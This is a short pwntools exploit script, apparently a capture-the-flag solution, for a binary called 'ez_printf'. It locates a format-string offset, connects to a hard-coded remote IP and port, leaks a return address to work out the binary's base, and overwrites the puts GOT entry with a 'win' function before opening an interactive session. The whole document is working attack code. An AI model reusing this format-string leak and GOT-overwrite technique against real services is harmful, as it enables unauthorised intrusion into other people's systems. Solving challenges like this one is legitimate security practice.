from pwn import *

elf = context.binary = ELF('./ez_printf',checksec=False)

def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    try:
        l = p.recv(timeout=1)
    except EOFError:
        l = b''
    p.close()
    return l

offset = FmtStr(send_payload).offset
info("offset = %d", offset)

# p=elf.process()
p = remote("74.207.229.59",20221)

# main ret address in local is %25$p but in remote is 27
p.sendline(b"%27$p")
p.recvuntil("twice\n")
addr=int(p.recvline().decode(),16)
elf.address=addr-int('0x11b3',16)

writes = {elf.got["puts"]:elf.symbols['win']}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)

p.interactive()
